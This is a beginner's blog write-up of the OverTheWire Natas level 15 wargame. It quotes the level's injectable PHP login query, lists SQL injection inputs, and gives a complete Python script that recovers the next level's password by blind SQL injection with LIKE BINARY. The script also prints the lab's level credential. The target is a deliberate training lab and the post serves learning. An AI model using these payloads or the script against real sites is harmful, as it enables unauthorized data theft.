---
layout: post
title: Natas15 Writeup
categories:
  - CTF writeups
  - natas
tags:
  - beginner
  - sqli
  - python
  - script
description: First Writeup! On OverTheWire Natas Wargame 15
date: 2024-10-25 22:49 -0400
---

### First Glance

Looking at the source code:

```php
if(array_key_exists("username", $_REQUEST)) {
    ...

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    ...
```

### Attack Vector

In line 3, there would be our SQL injection point as `username` field
is the only way to manipulate the query.

Also by looking at line 11, if the query returns at least 1 row, we
would have an indicator that our query is true (`The user exists`).

So for the first try, I made this query:

> `" OR 1=1 #`

(Using `#` for comment as only that worked in natas14), which worked pretty nicely.

### Where I got stuck

Then I tried a few things, knowing the username is natas16 and the password length
is 32 by comparing the previous passwords. We got another query:

> `natas16" AND SUBSTRING(password, 1, 1) = "a" #`

This query worked for the most part, I placed it in the script to get all
the characters, even verified it with the SQLi by placing the whole password in there.
But here comes the problem, why can't I get authorized to the next stage?

### Solution

Then I did some more research, found out that there's a SQL Keyword called `LIKE`,
where you can combine with `%` to check if the word start with that. Also when combined
with `BINARY` it can check case sensitive. Hence we have the final script:

```python
import requests
from requests.auth import HTTPBasicAuth
from halo import Halo


url = "http://natas15.natas.labs.overthewire.org/index.php"
username = "natas15"
password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
auth = HTTPBasicAuth(username, password)
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
pw_len = 32

passwd = ""


with Halo(text="Enumerating", spinner="dots") as loading:
    loading.start()
    print("\n")
    for i in range(1, pw_len + 1):
        for char in charset:
            # Move cursor up two lines and clear them before printing the new update
            print("\033[F\033[K\033[F\033[K", end="")

            data = {
                "username": f'natas16" AND password LIKE BINARY "{passwd + char}%" #'
            }

            print(f"Password: {passwd}\nQuery: {data}")

            r = requests.post(url, auth=auth, data=data)
            if "exists" in r.text:
                passwd += char
                break

print(f"Final password: {passwd}")

```
